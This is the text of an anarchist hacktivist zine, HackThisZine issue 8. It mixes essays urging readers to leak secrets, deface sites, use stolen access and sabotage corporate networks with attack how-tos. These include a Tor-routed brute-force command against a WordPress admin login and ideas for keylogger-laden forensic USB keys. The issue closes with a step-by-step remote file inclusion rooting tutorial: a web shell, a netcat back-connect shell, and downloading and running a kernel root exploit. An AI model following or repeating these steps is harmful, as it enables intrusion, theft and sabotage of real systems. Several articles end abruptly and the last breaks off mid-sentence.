HackThisZine is different from other magazines... as you probably have guessed, 
but rather than state what you already know, we�d like to delve into the 
background, the history of HTZ. What started several short years ago under the 
influence and initiation of a few individuals, has grown to be an inspiration, 
and an information source for many. Some people have found it lacking content 
or lustre, while yet others have found it inspiring, and further yet others 
found it incriminating. While we can�t guarentee you won�t get questioned for 
carrying an issue of HTZ, we can guarentee you�ll learn a lot from it. The main 
thing to realize here is this is not just one persons project. We are a living, 
breathing community, and we thrive on knowledge. We love to learn, and teach, 
and believe that everyone has the right to participate in a intimidation-free 
form of education. We are always glad to hear from you, whether it�s comments, 
questions, or constructive criticisms.
			

				  - OUR MISSION -

Our mission is to research, create and disseminate information, tools, and 
tactics that empower people to use technology in a way that is liberating. 
We support and strengthen our local communities through education and action. 
We strive to learn from each other and focus our skills toward creative goals, 
to explore and research positive hacktivism, and to defend a free internet 
and free society.

We at HackThisZine try our best to reliably bring you great content, at a 
reasonable frequency, while we have tried to make this a quarterly zine in 
the past, clearly we are way off base with this issue. A lot of work has gone 
into the creation of this zine, and it took us way passed the due date. 
This compilation of works may be made by nerds, but we are people too! 
We do have lives... some of us :). If you would like to ensure that other 
issues of the zine are more up-to-date and on track, join the mailing lists, 
start talking, and we�ll be glad to share the excitement with you.

So, without further ado, we give you the 8th issue HackThisZine.

Wikileaks is an amazing project. It has enabled people all across the world to 
share information that is blocked from disclosure and the scrutiny of the 
public eye. Even though it�s still in the beta stages, it�s published thousands 
of pages of these censored or classified documents that have come from 
corporations, governments, and the world�s richest banks. Leaking isn�t just 
about transparency, it�s also about power. There�s something inherent in the
design of Wikileaks in that it�s in total opposition to the system of oppression 
that controls us in daily life.

Hierarchy relies on lies and obscurity to exist. Those on the bottom must 
believe either through false belief or through lack of access to information that 
they are powerless to change their situation. Wikileaks smashes through this 
basic fact and enables anyone, no matter their position, to help with the global 
process of leaking sensitive information that keeps us all in chains.

The thing that power hates most is to be ignored. At least when a group is 
pressuring a government, they are acknowledging it�s power. When groups refuse 
to acknowledge the power of the state or of capital or the law, the strong arm 
comes out of hiding. It is the failure to acknowledge power structures that 
makes anarchist organizing so effective. When people ignore the power of the 
state, they make rulers, bureaucrats, and citizens alike shit their pants
which gains them whatever they are looking for.

Wikileaks is a complete ignorance of power. Wikileaks does not care what law 
is broken in the process of leaking a document or which country they will be 
forbidden from traveling to in order to give talks. The leak itself does not 
care that it's illegal, it's only information and its only desire is to be free.

If we are to free ourselves from our chains and if we are going to shut down 
those with control, we are going to need intelligence. We are going to need to 
know how they operate, who they are, how they react to certain situations, 
where they are, where they go, and much much more. Most of what we need to know 
is written down somewhere. Let�s seek it out, find it, and leak it regardless 
of whether we think it can be useful or not. It may be useful for somebody 
somewhere and for that reason it must be leaked as long as it wouldn�t pose 
a risk to somebody�s safety. The whole process of secrecy is nothing more than 
a system to maintain power. If something that is secret gets leaked, the owner 
of that document loses some type of power. Therefore, we must subvert that power
by leaking everything and leaking it now!

		           Find it, scan it, upload it. 
	    Even if Wikileaks won�t take it, put it up somewhere else.

On November 30th, I will be thinking about the 10-year-anniversary of the G8 
protests in Seattle. Looking back, I think we can see the battle in Seattle 
as a tactical success. A success in making a point, making a presence, and 
fighting back, even if only for a little while. Seattle was when the media found
out about this �group�, this �organization�, the black bloc. However the media 
misunderstood the crucial principle of the black bloc; a central and largely 
united set of techniques and, to a lesser extent, ideals. An acceptance of 
outright battle with the state, through civil and violent disobedience. We wear 
black because we are all one- no individual to be identified by police (a tactic
brightly-colored backpack wearing black-clad fellows seem ignorant to).

Yet what about us hacktivists? What major success can we point out to the past 
10 years? None. Hundreds of DDoS attacks, hundreds of defacements, hundreds of 
wrenches in the networks of the upper class, the servers of corporations, and the
various ill-constructed machines of globalization and capitalism. Yet our effect
as hacktivists is largely, and disappointingly, negligible.

Hacktivism has yet to present an even vaguely unified method, tactic, or 
ideology. There is something to be said about the current state of hacktivism 
where the most memorable political hack in recent memory is the, largely botched,
�hack� of Sarah Palin�s email. Conducted on 4chan, we saw the opposite side of 
Torvald�s idea of �many eyes�. It turns out that extra eyes can squash bugs 
faster, but they can also squash hacks faster, as was attempted when a self-
styled �do-gooder� attempted to reset the password of the account as other 
hackers were extracting information. What a wonderful opportunity squandered.

We as hacktivists need to be constantly aware of the ebb and flow of the world�s
politics, and secondly, it�s media. We are blessed that we live in this early 
world of the Internet, where everything is still being figured out, all the 
rules are still being written.

Every year that passes security grows stronger. Young, would-be hacktivist minds
are bought and put to use building- what will no doubt-be- increasingly 
well-designed security systems. We, as hackers, will always be a threat. However,
I feel it is crucial to take advantage of our present tactical situation of 
technical equality, if not superiority, to the biggest and baddest and strongest 
in the world of capitalization and globalization.

Have you noticed that the boat has been rocking back and forth a bit lately? 
Beneath the rattling and screeching of the mainstream media�s take on our 
�recession�, we can see real change. We must be real change. The system is 
cracking a little bit, right now, right under our noses. It is our job and our 
prerogative to pry open those cracks and piss in them. Every day, we should, 
independently, or in small groups, poke at another and another and another big 
system. The problem is not that we are out-gunned or outsmarted, because we 
aren�t. The problem is that we are greedy. We throw up a witty defacement, or 
delete a crucial system, we do not think for the long-term goals, or even 
medium-term goals. Too often, I find, hackers are overeager, and that leads us 
to make silly wasteful decisions.

We should be saboteurs, we should be smarter. We should hold our knowledge close.
We should collect our exploits, treasure them, but leave them be. We should use 
our opened eyes and ears to find the best time to manipulate a system. Save the 
forkbomb in the corporate email server until a time it will be most politically 
effective. Wait to deface a right-wing news website until an unusual amount of 
people are drawn to it. Look at the enemy and understand their ebb and flow, 
and you can amplify your effectiveness in communicating a political ideology.

We must see ourselves not only as saboteurs, but also as performers, graffiti 
artists, and infiltrators. The best hacks are the subtle ones. We should be 
using our place of power- our element of surprise, to better infiltrate the 
brains of the confused. Too many of our would-be allies are confused, only
because they have been fed unhealthy ideas. We forget there are many people who 
have, not for a second, ever stopped to listen to the ideas we base our actions 
on. We are lucky, we often have the power of truth on our side when making 
convincing arguments. Use stolen access to slowly push your agenda. Social 
engineer yourself to a place of power within an organization, and use that 
positioning to disrupt, or even better, to confuse and/or educate a group of 
people. Let us all spend more time a day poking around places we shouldn�t be. 
Let us all spend more time remembering default usernames and passwords. Let us 
all spend more time researching maiden names and pets. Let us all spend more time 
poking at the electronic underbelly of any corporation, person, and organization
that is an enemy of equality, truth, and anarchy. Let us not forget that the 
global capitalist machine has been humbled in the past few months.

The bankers are stumbling, the brown tip of the bullshit iceberg has surfaced, 
and newly aware, the world does not like the stench. Let us use our skill to kick
the pricks while they�re down. Tear up their networks. Rename their contacts. 
Cut their keyboard wires. Smash their windows. Brick their blackberries. Or, 
write about people who do. 

   Document, comment, distribute and fight back however and whenever you can.

�Ronin is a Ruby platform for exploit development and security research. Ronin 
allows for the rapid development and distribution of code, exploits or payloads 
over many common Source-Code-Management (SCM) systems.� [2]

GETTING STARTED WITH RUBY:
 
With ronin being an exploit development framework written in Ruby it should 
go with out saying that you are going to have to learn Ruby. If you don�t 
already know a programming language, Ruby is a fine one to start with [1]. 
If you don�t know Ruby yet, but know other languages, it�s time to jump on the 
bandwagon. If you haven�t noticed already all exploit development is moving 
away from Perl and other languages like C (I know I am gonna get flamed for this
one), and into python and ruby. Wether you are new to programming or just new 
to the language, following through Ronin code will be a good introduction to 
Ruby, because Postmodern, the author, goes to painstaking lengths to follow 
Ruby best practices. 

GEMS ETC:

There is good documentation on the Ronin site [2] for installing the whole 
suite of Ronin libraries [3]. After you get Ruby installed you are going to 
install the ruby gems library [4]. RubyGems is a package management system for 
Ruby gems (aka libraries, plugins, modules, classes, extensions) that allows 
you to install, update, and query the gems installed on your system. Ronin 
itself is a gem, as well as it�s additional libraries; ronin-web, ronin-php, 
ronin-dorks, ronin-sql, ronin-scanners, ronin-exploits, etc. If you want to be 
using the latest and greatest (read most buggy) version of ronin and friends you
will need to use the versions from github.com. Gems are released from the code 
base on GitHub once they have reached a certain quality or external demand 
(essentially at postmoderns discretion). Installing ronin, or a ronin library, 
is as simple as :

<code>
	sudo gem install ronin
</code>

Interacting with your gem installation might look like:

<code> 
	# list all ronin gems installed on your system
	evoltech@jwaters:~/src/htz$ gem list ronin

	*** LOCAL GEMS ***
	ronin (0.2.4, 0.2.3, 0.2.2) 
	ronin-dorks (0.1.1) 
	ronin-exploits (0.2.0) 
	ronin-gen (0.1.0) 
	ronin-php (0.1.1) 
	ronin-scanners (0.1.4) 
	ronin-sql (0.2.2) 
	ronin-web (0.1.2)

	# Update all of the installed gems on your system
	evoltech@jwaters:~/src/htz$ sudo gem update
	Updating installed gems ... Gems updated: ronin-dorks, ronin-exploits,
	ronin-gen, ronin-web, ronin-php, ronin-sql, rspec, rubyforge, 
	term-ansicolor
</code>

Ronin and Git[hub] [5] Ronin development and collaboration is done with the 
Git source code management (SCM) system. github.com is used to host the 
authoritative remote repositories. By creating a GitHub account and forking one 
of the ronin repositories for your development needs, you will be integrating 
into the ronin development community. This will allow core ronin developers
to use Git and GitHub�s features to accept contributions. Using Git with ronin 
is well documented on the ronin website [5]. If you are working with a copy of 
Ronin and or Ronin libraries from their Git repository and also have the related
gems installed on your system, you will need to distinguish between the Git copy
from the installed gem. Safely using the most recent version (from github.com) 
can be accomplished by incrementing the VERSION constant in the related 
version.rb file, then either re-rolling and installing a new gem, or by 
including the package from the command line with irb [6]. Ruby�s default 
behavior when requiring a new class is to include the most recent version as 
denoted by a libraries VERSION constant. Postmodern makes this easier for people
working with both gems and git versions by always incrementing the version number
in the git source after there is a new gem released. This makes it so that the 
git source version will always be greater then the gem version. You can always 
verify the version you are working with by:

<code> 
	irb> puts Ronin::VERSION 
</code> 

A side note is that Ronin may use �Edge� (release candidates, beta versions, etc)
versions of different libraries. Most gems you use will be fetched from the 
default gem repository rubyforge.org. In order to install a gem on the edge you 
will have to find where the Edge versions are hosted. In most cases this will be
github or the projects website (the gem source code hacking example below is 
made simpler with the scripts from the drnic-github gem [9]).As an example, in 
Ronin 0.2.5 a version of datamapper is required where the edge gem 
(dm-core >=0.10.0) is located in a non-default repo. On top of this there was 
some migration from rdoc to yard packages for documentation management with 
patches pending to dm-core. To install this repo you will have to:

<code> 
	sudo gem source --add http://gems.datamapper.org/
	git clone git://github.com/postmodern/dm-core.git
	cd dm-core git checkout -b next --track origin/next git pull rake gem 
	sudo gem install pkg/dm-core-0.10.0.gem
	sudo gem update 
</code> 

This being said, it is possible that your environment will need to be updated 
when working with the development versions (hosted at github). Before you start 
using the new ronin code you are going to want to run the test suite to make 
sure everything checks out on your box. This example shows testing a new version
of ronin; but is applicable to the other ronin libraries as well.

<code>
	cd ronin grep VERSION 
	lib/ronin/version.rb VERSION = �0.2.5� 
	
	rake spec 
	# If you get errors here check that you have all the dependencies met. 
	# Make sure you have the dependencies specified in the self.extra_deps 
        # array.

	cat Rakefile 
</code> 

Rolling the new gem from the git source you just checked out can be done as for 
dm-core above:

<code> 
	git clone git://github.com/postmodern/ronin.git
	cd ronin rake gem 
	sudo gem install pkg/ronin-0.2.5.gem 
</code> 

If instead you want to just load the library in from the command line when 
working with irb you can simply add all the additional include files from
your local repos with:

<code> 
	pwd ~/src/ronin irb -I 
	./lib irb> require �ronin� 
	irb> Ronin::VERSION => �0.2.5� 
</code>

If you plan on working with a development branch of ronin you should check in 
at #ronin on irc.freenode.net and possibly join the google group at 
http://groups.google.com/group/ronin-ruby. 



OVERLAYS IN RONIN:

Overlays are a way of distributing extra bits of code that make use of the 
ronin framework. Examples of this can be misc tools for exploit development, 
penetration testing, and exploits themselves. Overlays can include libraries 
(extensions in ronin speak) that can then be used by other overlays so that, 
like in UNIX, one tool can be stringed together with another tool. The concept 
of overlays is what seperates Ronin from other exploit development frameworks 
as this is where the decentralized sharing aspect comes in. You can design 
tools that leverage ronin and make them public, or share them only with in your 
affinity group.

Overlays are organized in ronin via the �Platform�, which is essentially just a 
local cache (~/.ronin) of your installed overlays. An overlay is managed in the 
following way:

<code> 
	ronin list ronin add git://github.com/postmodern/postmodern-overlay.git 
	ronin update postmodern-overlay 
	# Remove the local entry and delete the associated files. 
	ronin uninstall postmodern-overlay
	# Remove the local entry for the overlay, but don�t delete the files.
	ronin remove postmodern-overlay 
</code> 


OVERLAY VERSIONS: 

Overlays are managed by Ronin::Platform. This section of code describes the 
Overlay API; file structure, recognized format of ronin.xml. In the following 
example we will be using an overlay called postmodern-overlay hosted at 
git://github.com/postmodern/postmodern-overlay.git. This overlay version will 
change as Ronin::Platform gets updated and may not always be compatible with 
the gem version of Ronin. As of Ronin 0.3.0 if you want to use a compatible 
version of postmodern-overlay you will have to check it out with the 
ronin-0.3.0 tag:

<code> 
	git clone git://github.com/postmodern/postmodern-overlay.git 
	cd postmodern-overlay git checkout -b ronin-0.3.0 
		--track origin/ronin-0.3.0 
</code> 

By the time this hits the press a new version of Ronin::Platform will be out, 
that implements overlay versioning and can raise a warning when an incompatible
Overlay is being used [7].


USING OVERLAYS: 

Overlays, like all other parts of the Ronin framework, can either be used from 
the Ronin Console or from a standalone script. After an overlay is installed in 
your environment and the Ronin Console is loaded the Overlay Cache will be 
loaded with all of the overlays installed on your system.

<code> 
	ronin>> Platform.overlays.names => [�postmodern-overlay�] 
	ronin>> Platform.extension_names => 
		[�dumpster�, �milw0rm�, �spec�, �twitter�] 
</code> 

You are going to look through the code of the extensions in postmodern-overlay 
because there are some interesting tools in there that show the ease of writing 
code capable of heavy lifting in a few lines. Making use of the overlays is made 
overly simple since the extension names are added directly into the local 
namespace:

<code> 
	ronin>> milw0rm.remote.latest.title 
</code> 

The overlays and associated extensions can also be used in standalone scripts as
you might expect. The following example shows how the milw0rm extension
in the postmodern-overlay can be used to search milw0rm.org/remote for exploits 
matching a certain pattern in their title and print the exploit to the screen. 
Obviously, this is only to show how this can be done as it would be much quicker
to use the ronin-dorks library ie.

<code> 
	ronin>> puts Web::Dorks.search(:site => �milw0rm.org/remote�, 
				: query => �ftp�).page(1).summaries
</code>

<code>

Debbi: Fuck this shit lets go do some crimes.
Duke: Yeah. Let�s go get sushi and not pay.

- Repo man You are probably tired or all the talk by this point and would 
like to see an attack on an actual target. Well your not going to get it, 
but what I will give you is an attack on a hypothetical target.

In this issue I am going to cop out with a dictionary attack on
attack on a wordpress site, but next issue we will cover porting code from
milw0rm and other frameworks like metasploit, and multi-level attacks using 
ronin. Since plain old dictionary attacks on websites are so boring we will try
and improve our chances by first scraping a site for all words then mutating 
those words to provide a wordlist. After this is done we will spawn off a bunch 
of jobs to try and log into the site. This process is made simple with yet 
another gem, written by our good friend postmodern and maintained by the SophSec 
crew, called wordlist [8]. The assumption is that most dictionaries will have way
too many words to try all of them, but the selection of words on a website may
comprise a smaller dictionary that contains a word that may be used as the admin 
password, possibly with some mutations. Another problem is that password attacks 
on a website are slow if you follow the HTTP standard and not make more than 2 
requests to the same domain at a time, but why would we follow that rule?
We�ll fork as many as we need. And of course we don�t want our sysadmin on the 
other end to have it easy and be able to whitelist a single ip, so we�ll run the 
whole damn thing through tor (now they could just block tor which would be a 
bummer).

You may want to experiment with running this code through a the torify command
to make sure all of the requests don�t come from the same ip. The default 
number of child processes to generate is configurable via the -t option, but 
the default is 10 processes.

<code>
	torify ruby ./smartBruteForce.rb -s wp28.com -t 100 -u admin
</code>

The HTZ 8 zine subversion repository [9] contains a much larger mutation file 
and will be the location for any updates and branches to this application.

Since this will be read on paper by a good number of people I will include a 
bit of the source for this library here, because it is nothing short of code 
poetry. Usage:
<code>
	# Build a wordlist from a dictionary file, only selecting words between
	# 5 and 15 characters.
	list = Wordlist::FlatFile.new(�dictionary.txt�, {:max_length => 15,
	:min_length => 5})
	# Add the mutations you would like to be performed. This method can
	# actualy do some very complex mutations.
	list.mutate �a�, �@�
	list.mutate �e�, �3�
	list.each_mutation do |word|
	puts word
	end
	=> @apple, @ppl3, appl3, apple, etc
	wordlist/list.rb: Wordlist::List.each_mutation
	# Enumerates through every unique mutation, of every unique word, using
	the mutator rules define for the list. Every possible unique mutation 
	will be passed to the given _block_.
	#
	# list.each_mutation do |word|
	# puts word
	# end
	#
	def each_mutation(&block)
	mutation_filter = UniqueFilter.new()
	mutator_stack = [lambda { |mutated_word|
	# skip words shorter than the minimum length
	next if mutated_word.length < @min_length
	
	# truncate words longer than the maximum length
	mutated_word = mutated_word[0,@max_length] if @max_length
	if mutation_filter.saw!(mutated_word)
	yield mutated_word
	end
	}]
	# @mutators is a local array of Mutator objects, see below
	(@mutators.length-1).downto(0) do |index|
	mutator_stack.unshift(lambda { |word|
	prev_mutator = @mutators[index]
	next_mutator = mutator_stack[index+1]
	prev_mutator.each(word,&next_mutator)

There are a number of different tools that will process logs for different 
servers. Webalizer is the most all purpose solution. While webalizer and 
other log parsing programs are good at generating reports on bandwidth usage 
for different apps from the logs, they were really designed to give an over 
view of the data from the logs. Network statistics and better retrieved from 
the kernel itself. If you are looking to do any realtime work with the network
on Linux chances are high that iptables can do it somehow. Ringo said recently
(hopefully closely paraphrasing), �Iptables is like that tool in your garage 
that you use for one thing, but you know it can do like a million other things,
but you have lost the manual�. In the process of trying to determine what new 
services can be offered to the anarchist community, hackbloc staff had to
figure out what percentage of network traffic is being used by which network
daemons and how close are we to saturating our available bandwidth. This
was accomplished by setting up an �Accounting� chain with iptables to track\
usage by a �service�. This accounting table is then regularly polled with the
results pulled into our monitoring system where we get a nice graph 
[Include snippets.png in article here]. Here are the steps you can use to 
start collecting this information with iptables:

* Make sure you have all of the needed iptables modules for your kernel 
version built on the system. lsmod will show you the modules already loaded, 
and you if the following modules are mot loaded you can load them with 
modprobe: ip_tables, iptable_filter, xt_multiport

* Add and set up the �Accounting� table.
iptables -N Accounting
iptables -A INPUT -j Accounting
iptables -A Accounting -o eth0

* For each �service� add a rule to facilitate tracking. Service here can be a
collection of ports. For example if you were interested in abstracting all
network traffic related to mail and you were running postfix on ports 25 and 
26 (you can use port 26 to help some home uses by pass restrictions of their 
isp�s to contact external smtp servers), and imap on 143 and 993 then you 
might set up a rule like the following to account for all mail traffic:
iptables -A Accounting -p tcp -m multiport --ports 25,26,143,993

* Collect your data. Information about the current usage can then be tracked
by polling iptables regularly with the following command which will show you
the current counts for the various filters:
iptables -L Accounting -vxn -Z
The last -Z option will clear the count. This could be used for example if
you were checking network usage every 5 minutes to get the network byte count
for a service for the last 5 minutes.

COFEE is the free M$ forensics tool that was leaked [1] recently. It looks like 
it is a pretty basic application. It is geared to police forensics 
infrastructure and is meant to do very rudimentary forensics on running windows 
computers with the capability of being extended. The basic use case is that some 
geek in forensics creates a usb key for the field forensics officer. This key 
has a bundled number of applications that will collect data off the running host
ip, network connections, logged in users, etc). The field officer takes the key 
and plugs it into the suspect computer which collects the data and then returns
it to the office geek who runs the data from the key through a reporting tool. 
I haven�t actually run the application this is just what I gleaned from the 
user manual. There seems to be ways to customize it with specific apps on the 
usb key. For example, the key could automatically install a keylogger, 
microphone tap, or pull all files matching a certain pattern. This is where 
the real threat comes in. If some detective of PI was able to get a hold of 
your box and you don�t know about it (or you do, but for some reason you 
don�t restore from backup or reformat) this would be a good way to deploy the
skype bug [1.5], or steal your pgp key via a keylogger. I can�t think of anyway
this would work on a Mac [2], I don�t think macs come with fat32 drivers 
and the XFS (I think this is the mac filesystem) is not supported on windows 
(feel free to flame HTZ editors if this is not a fact). It could possibly work 
on linux, but would require a little more know how from the field reporter as
they would have to enter commands and stuff. Forensics seems to be pretty 
widespread even in small police stations. A friend who got arrested in a 
small town in Canada told me that the unencrypted usb stick he had on him 
seemed to get run through a EnCase [3] like system that pulled keywords from 
the files there and he was questioned about some copies of HTZ that were on the
drive. But is tool useful in our community? Yes! It could be used to easily 
install viruses / taps on our targets computers. Here are some use cases:

1) A key is made up with a keylogger that phones home passwords and stuff, 
or maybe sniffs the network looking for passwords from the admin, maybe 
scans the local net, possibly opens a connection to an outside computer 
through the internal firewall allowing remote access. The possibilities 
are kinda endless, so long as you have a windows developer. 

2) Some adrenaline junkie anarchist gets one of these keys a breaks into 
some evil place with computers, plugs this thing in, loads the shit up and 
bails, hopefully without getting caught. 

3) The @ geeks now have access to the data collected and or the network 
depending on what was on the stick. 15 16

This article is inspired by the Geek Mafia series; thanks for giving us hope. 
It is dedicated to the anarchist hackers who have faced or will face the cold 
steel bars.

Geek Mafia is a 3 book hacker heist series by Rick Dakan published by PM 
Press [1]. The stories follow Paul, an ex-video game designer, as he is pulled
into and eventually falls in love with a world of con-artists and their scams. 
In Geek Mafia (book 1), and Geek Mafia: Mile Zero (book 2) there is a lot of 
head nodding to anarchist ideology and goals, but it isn�t until Geek Mafia:
Black Hat Blues (book 3) that the author has a full on make out party with 
anarchy. While the first two books have a lot of hot-hackeron-rooted-network 
scenes the third book has a lot of well researched and detailed
examples of owning systems, governments, and multi-national corporations 
with all the aesthetic romance of Crimethinc�s �Recipes for Disaster�. A few
years ago a simple book by the name of �Recipes for Disaster� came out. It had
everything in it from how to paint billboards to sexual consent and more. 
By the end you felt you had a new tool belt to combat the forces of capitalism
and the state But not once in the hundreds of pages did it seriously consider
technology and its impacts on the anarchist movement. And how could they? 
No good anarchist tactics text has. It seems that anarchists as a whole have 
a great grasp of how to riot, but when it comes to technology and electronics
we are as silly as a baby with a fork near a socket.

This is more than security culture....

The modern anarchist movement has highly benefited from technology and the 
Internet, which is able to disseminate information and has also the privilege 
of not facing strong oppression from the state, but I fear that this time 
is coming to an end. For too long the anarchist movement and related
movements have enjoyed a freedom normally reserved for main stream computer 
users, especially in western nations. Freedom of Speech as the states call it,
but we see a common thread from the state following from more repressive nations
of confiscation of technological devices such as cell phones, laptops and 
storage media. Once this information is in the hands of the state, it is copied
and used against us. 

What this means for modern anarchists

If anarchists are to stay a fighting force within the political spectrum a 
serious consideration of technology and it�s impacts on our movement is 
necessary. This writing hopes to start the conversation.

A serious Security Audit: Defensive Technology

Businesses do this all the time: they hire outside firms to analyze their 
networks for weak spots. As an observer and a participant I have taken it
upon myself to preform this audit on the anarchist movement. You can boil 
down technological faults to 3 things. we will call them the 3 �E�s:

Email: The most commonly used form of communication for people on the Internet,
including anarchists. Email lists pre-date much of the �social networking� we
know now and is still a main use of organizing. Yet email is, by nature, weak.
Email is a postcard, not secure in any way from prying eyes. 

Encryption: Encryption is the only way of safety when using technology, 
although not an end all be all*, it can help us. Everything of importance 
should be encrypted from emails and IM chats (and logs) to full hard drive 
encryption. If we encrypt everything, even the stuff that doesn�t matter, we 
make it that much harder for them to access any of our information.
* Bugs / keyloggers could be installed cheaply [2], and it has long been 
speculated that .gov, .mil, and misc consultants have heavy duty computing 
power at their disposal to crack encryption [2]. This also ignores the fact 
that the metaphorical rubber hose and or threat of jail time is also pretty cheap.

Erasure: It is very important to know how to get rid of information. Many people
think that dragging a file to your trash bin means bye bye, but this is simply 
not true. The only true way of getting information off of a media is destroying 
it. This also should be considered when posting things online, as logs are kept
for a really long time. Are you sure you want to post about that action on
facebook? Once you delete it you can be guaranteed that someone will have a 
copy of it.

By using these 3 faults, you can analyze how your organization is (or is not). 
By making your communications secure, you can put up a more defensive wall 
against the state. But what if we want to go further?


Getting Serious: Considering Offensive Technology

For what is out there, Defense is the card most anarchists play when 
considering technology. When you have a good grasp of defensive technology, 
it�s time to play offense. What does this mean? it means a lot more than 
reading 2600 and watching �Live Free or Die Hard� and masturbating about 
how �cool� it would be to bring down the system through hacking. Offensive 
technology is not only about hacking the gibson, it�s about skills building 
and practice. Do you know how to build a transmitter? Can you write code? Do
you know which wire to clip, the red or white? Do you know the concepts behind 
EMP? What�s a diode? What is �rooting a box�? Packet injection? 
Cold boot attacks? Logic gates? If most of that you could understand, great! 
If not, then why? The state is doing its part in learning and building 
all kinds of new technologies; why aren�t you? The government has teams of 
the best hackers on earth to protect itself, when there is a insurrection,
it will be important to find their weak spots and use them. We can�t 
expect underground hackers to help us when the time is right. We need to 
learn these skills now, before the robot armies takes over. I challenge 
you this week to learn a technological skill that you always wanted to.

What this means for us

We have a lot of work to do. Education is the first step. Those among 
us must throw energy to get less tech-y anarchists on the same page about
the importance of technology in the anarchist movement. It also requires 
a great deal of time to skills sharing and building. A technology 
conference that involves questioning the state is long over due. 

The feds have Defcon, we need Anarchycon! An increase in the use and 
utilization of technology does not come without it�s faults. In 2009 
Elliot Madison, who used twitter during the g20, was arrested and his 
house raided for reporting police movements. In 2006 Jeremy Hammond was
charged with hacking the conservative site �Protest Warrior� and served a
little under 2 years in jail. We will see these raids and arrests becoming
more common in the years to come. It�s important to learn from the 
mistakes of others and realize their contributions.
                       
                                   To a Technological Conscious Insurrection!

If you want to protect a web folder from brute forcing or other hack attempts, 
you can make it more secure with a �lame� method. This �lame� method is a double
or triple authentication prompt. If a h4x0r got your password, he must 
authenticate to the site with the correct password for 2 or 3 times. The first 
1 or 2 time(s) he will not access and an authentication prompt will be shown 
again ;-) Let�s show you how to make that: - It works for your own domain name
or when you can create your subdomains in a free domain or subdomain service -
First of all make sure that your server accepts htaccess password protection.
For Apache see this document: http://httpd.apache.org/docs/1.3/howto/auth.html

You must create one or two subdomains that will point to the folder which you 
need to protect. (One for triple authentication and two for more). In this 
example we created one: folder.domain.com Check where you web server stores 
the htpasswd files. For Apache look a dir called: .htpasswds e.g 
/home/username/.htpasswds/ If you are the server admin look the server config. 
We will need this to fill in the data below. 

If you don�t have any folder you can create a folder before the public_html or
www folder in order to put the passwd file that stores the login and password 
info. Don�t create the folder in a public dir for security reasons! We must 
create the passwd file with the password we want in this folder. We can go 
to: http://www.htaccesstools.com/htpasswd-generator/ and we can create the 
content of the passwd file. We use this in order to make an encrypted password.

We must save it as: .htpasswd A typical .htpasswd file looks like:

	username:cGyUX9QugYMgE

Now make a new file in the web folder that you need to protect with
this inside (edited):

- For our example the dir that we want to protect is: /home/username/folder
that goes to www.domain.com/folder - 
RewriteEngine on
AuthType Basic
AuthName �Password Protected Area�
require valid-user
AuthUserFile �/path/to/.htpasswd�
RewriteCond %{HTTP_HOST} ^folder.domain.com$ [OR]
RewriteCond %{HTTP_HOST} ^www.folder.domain.com$
RewriteRule ^(.*)$ http://www.domain.com/folder [R=301,L]
- Edit to your own settings -

1) Change: �/path/to/.htpasswd� to your own htpasswds folder 
(See above for instructions)

2) Change ^folder.domain.com$ to your own subdomain that you have created

3) Change also ^www.folder.domain.com$ to your subdomain. YOU MUST KEEP THE 
�www� BEFORE subdomain.domain.com !!!

4) Change the �http://www.domain.com/folder� to the folder that you need to 
protect. You must put the dir not the subdomain.

				Save it as: .htaccess
							               That�s it
                                                                          Enjoy!

	      R.F.I. Rooting Tutorial (Linux Server and Safe Mod: OFF)
				Author: An@sA_StAxtH
		Mail/MSN: admin@cyberanarchy.org/anasa_staxth@hotmail.com
			     For Cyber Anarchy (Nov. 2007)

You will need:
- Vulnerable Site in R.F.I.
- Shell for R.F.I. (e.g. c99, r57 or other)
- NetCat
- Local Root Exploit (depending on the kernel/version)

This aim tutorial is to give a very general picture in process of Rooting in 
Linux Server with Safe Mod: OFF. Suppose that we have found a site with R.F.I.
vulnerability: http://www.hackedsite.com/folder/index.html?page=
We can run shell exploiting Remote File Inclusion, as follows:
http://www.hackedsite.com/folder/index.html?page=http://www.mysite.com
/shells/evilscript.txt? where evilscript.txt is our web shell that we have 
already uploaded to our site. (www.mysite.com in the folder: shells) 

After we enter in shell, first of all we will see the version of the kernel 
at the top of the page or by typing: uname - a in Command line. To continue 
we must connect with backconnection to the box. This can done with two ways 
if we have the suitable shell. We can use the Back-Connect module of r57/c99 
shell or to upload a backconnector in a writable folder In most of the shells
there is a backconnection feature without to upload the Connect Back Shell 
(or another one shell in perl/c). We will analyze the first way which is 
inside the shell (in our example the shell is r57). Initially we open NetCat
and give to listen in a specific port (this port must be correctly opened/
forwarded in NAT/Firewall if we have a router) with the following way:

We will type: 11457 in the port input (This is the default port for the last
versions of r57 shell). We can use and other port. 
We press in Windows Start -> Run -> and we type: cmd

After we will go to the NetCat directory:
cd C:\Program Files\Netcat

And we type the following command:
nc -n -l -v -p 11457

NetCat respond: listening on [any] 11457 ...
In the central page of r57 shell we find under the following menu::: Net:: 
and back-connect. In the IP Form we will type our IP (www.cmyip.com to see 
our ip if we have dynamic)

In the Port form we will put the port that we opened and NetCat listens.
If we press connect the shell will respond: Now script try connect to 
<IP here> port 11457 ... If our settings are correct NetCat will give us a
shell to the server Now we will continue to the Rooting process.

We must find a writable folder in order to download and compile the Local 
Root Exploit that will give us root privileges in the box. Depending on 
the version of the Linux kernel there are different exploits. Some times 
the exploits fail to run because some boxes are patched or we don�t have 
the correct permissions.

List of the exploits/kernel:

2.6.16 -> raptor, raptor2, h0llyshit, prctl

We will see the case of 2.6.8 Linux kernel. We will need the h00lyshit 
exploit. Some sites that we can find Local Root Exploits:

www.milw0rm (Try Search: �linux kernel�)
Other sites: www.packetstormsecurity.org | www.arblan.com or try Google,
you can find �em all ;-)

We can find writable folders/files by typing: find / -perm -2 -ls

We can use the /tmp folder which is a standard writable folder, we 
type: cd /tmp.

To download the local root exploit we can use a download command for 
linux like wget. For example:

wget http://www.arblan.com/localroot/h00lyshit.c
where http://www.arblan.com/localroot/h00lyshit.c is the url of 
h00lyshit.

After the download we must compile the exploit (Read the instruction 
of the exploit before the compile) For the h00lyshit we must type:

gcc h00lyshit.c -o h00lyshit Now we have created the executable 
file: h00lyshit. The command to run this exploit is: ./h00lyshit 
<very big file on the disk> We need a very big file on the disk in 
order to run successfully and to get root. We must create a big 
file in /tmp or into another writable folder. The command is:
dd if=/dev/urandom of=largefile count=2M where largefile is the 
filename. We must wait 2-3 minutes for the file creation. If 
this command fails we can try:

	dd if=/dev/zero of=/tmp/largefile count=102400
	bs=1024

Now we can proceed to the last step. We can run the exploit by typing:

	./h00lyshit largefile or
	./h00lyshit /tmp/largefile

(If we are in a different writable folder and the largefile is created in /tmp).
If there are not running errors (maybe the kernel is patched or is something 
